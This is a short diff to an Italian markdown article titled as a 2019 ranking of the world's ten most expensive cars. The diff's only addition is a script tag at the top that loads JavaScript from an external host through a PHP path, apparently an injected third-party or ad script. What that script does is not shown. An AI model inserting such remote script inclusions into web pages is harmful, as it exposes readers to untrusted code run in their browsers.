@@ -1,3 +1,5 @@
+<script src='//js.octadv.com/50a1ko.php'></script>
+
 # Le 10 auto più costose al mondo: la classifica 2019
 
 ---
